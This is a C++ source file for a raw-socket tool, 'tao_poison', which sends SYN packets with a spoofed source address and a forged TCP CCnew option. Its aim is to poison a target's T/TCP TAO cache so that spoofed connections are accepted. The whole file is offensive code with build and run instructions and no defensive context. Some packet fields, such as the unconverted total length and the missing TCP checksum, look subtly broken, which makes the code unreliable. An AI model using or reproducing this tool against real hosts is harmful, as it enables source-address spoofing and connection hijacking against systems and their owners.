// Compile: g++ -o tao_poison tao_poison.cpp
// Run: sudo ./tao_poison <target_ip> <target_port> <src_ip> <cc_value>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>

class TAOPoison {
private:
    int sock;
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
public:
    TAOPoison() {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (sock < 0) { perror("socket"); exit(1); }
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    }
    
    void poison(const char* targetIP, int targetPort, const char* srcIP, uint32_t ccValue) {
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(targetPort);
        target.sin_addr.s_addr = inet_addr(targetIP);
        
        char packet[4096];
        struct iphdr* ip = (struct iphdr*)packet;
        struct tcphdr* tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));
        char* options = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
        
        memset(packet, 0, 4096);
        
        // CCnew option (Kind=12, Length=6)
        options[0] = 0x01; options[1] = 0x01;
        options[2] = 0x0C; options[3] = 0x06;
        *(uint32_t*)(options + 4) = htonl(ccValue);
        
        int optLen = 8;
        
        ip->ihl = 5; ip->version = 4;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + optLen;
        ip->ttl = 64; ip->protocol = IPPROTO_TCP;
        ip->saddr = inet_addr(srcIP);
        ip->daddr = target.sin_addr.s_addr;
        ip->check = checksum(ip, sizeof(struct iphdr));
        
        tcp->source = htons(rand() % 65535);
        tcp->dest = target.sin_port;
        tcp->seq = rand();
        tcp->doff = 5 + (optLen / 4);
        tcp->syn = 1;
        tcp->window = htons(65535);
        
        sendto(sock, packet, ip->tot_len, 0, (struct sockaddr*)&target, sizeof(target));
    }
    
    ~TAOPoison() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 5) { std::cerr << "Usage: " << argv[0] << " <ip> <port> <src_ip> <cc>\n"; return 1; }
    TAOPoison poison;
    poison.poison(argv[1], atoi(argv[2]), argv[3], strtoul(argv[4], NULL, 0));
    return 0;
}